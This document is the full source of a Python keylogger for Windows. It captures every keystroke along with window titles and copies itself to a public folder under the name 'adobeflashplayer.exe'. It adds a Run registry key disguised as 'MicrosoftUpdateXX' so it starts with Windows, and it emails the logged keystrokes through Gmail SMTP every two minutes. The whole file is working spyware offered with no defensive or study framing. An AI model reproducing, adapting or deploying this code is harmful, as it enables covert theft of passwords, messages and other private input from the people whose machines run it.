import pythoncom
import pyHook
from os import path
from time import sleep
from threading import Thread
import urllib, urllib2
import smtplib
import datetime
import win32com.client
import win32event, win32api, winerror
from _winreg import *
import shutil
import sys

ironm = win32event.CreateMutex(None, 1, 'NOSIGN')
if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
    ironm = None
    print "nope"
    sys.exit()

x, data, count= '', '', 0

dir = r"C:\Users\Public\Libraries\adobeflashplayer.exe"
lastWindow = ''

def startup():
    shutil.copy(sys.argv[0], dir)
    aReg = ConnectRegistry(None, HKEY_CURRENT_USER)
    aKey = OpenKey(aReg, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0, KEY_WRITE)
    SetValueEx(aKey,"MicrosoftUpdateXX", 0, REG_SZ, dir)    
if not path.isfile(dir):
    startup()   

    
def send_mail():
    global data
    while True:
        if len(data) > 30:
            timeInSecs = datetime.datetime.now()
            SERVER = "smtp.gmail.com"
            PORT = 587
            USER = EEMAIL
            PASS = EPASS
            FROM = USER
            TO = [USER]
            SUBJECT = "B33: " + timeInSecs.isoformat() 
            MESSAGE =  data 

            message_payload = "\r\n".join((
                                "From: %s" %FROM,
                                "To: %s" %TO,
                                "Subject: %s" %SUBJECT,
                                "",
                                MESSAGE))
            try:
                server = smtplib.SMTP()
                server.connect(SERVER, PORT)
                server.starttls()
                server.login(USER, PASS)
                server.sendmail(FROM, TO, message_payload)
                data = ''
                server.quit()
            except Exception as error:
                print error
        sleep(120)


def pushing(event):
    global data, lastWindow
    window = event.WindowName
    keys = {
            13: ' [ENTER] ',
            8: ' ',
            162: '   ',
            163: '  ',
            164: '  ',
            165: '  ',
            160: '  ',
            161: '  ',
            46: '  ',
            32: ' ',
            27: '  ',
            9: '  ',
            20: '  ',
            38: '  ',
            40: '  ',
            37: ' ',
            39: ' ',
            91: '  '
            }
    keyboardKeyName = keys.get(event.Ascii, chr(event.Ascii))
    if window != lastWindow:
        lastWindow = window
        data += ' { ' + lastWindow + ' } '
        data += keyboardKeyName 
    else:
        data += keyboardKeyName

if __name__ == '__main__':
    triggerThread = Thread(target=send_mail)
    triggerThread.start()

    hookManager = pyHook.HookManager()
    hookManager.KeyDown = pushing
    hookManager.HookKeyboard()
    pythoncom.PumpMessages()
